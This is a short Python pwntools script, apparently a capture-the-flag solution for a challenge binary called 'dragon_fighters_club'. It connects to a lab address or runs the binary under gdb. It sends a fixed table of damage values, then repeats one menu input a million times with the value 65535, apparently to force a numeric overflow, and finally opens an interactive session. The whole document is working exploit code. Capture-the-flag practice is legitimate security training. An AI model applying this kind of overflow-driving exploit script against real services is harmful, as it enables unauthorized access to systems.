from pwn import *

if args.REMOTE:
  r = remote("192.168.100.3", 38303)
else:
  r = gdb.debug("./dragon_fighters_club", """
    continue
  """)

damages = {
    0:256,
    1:512,
    2:768,
    3:1280,
    4:6656,
    5:12288,
    6:17664,
    7:40960,
    8:81920
}

for i in range(9):  
    r.recvuntil(b"> ")
    r.sendline(b'3')
    r.recvuntil(b"> ")
    r.sendline(bytes(f'{i}', 'utf-8'))
    r.recvuntil(b"?\n")
    r.sendline(bytes(f'{damages[i]}', 'utf-8'))

for i in range(1000000):
    r.recvuntil(b"> ")
    r.sendline(b'3')
    r.recvuntil(b"> ")
    r.sendline(b'7')
    r.recvuntil(b"?\n")
    r.sendline(b'65535')

r.interactive()
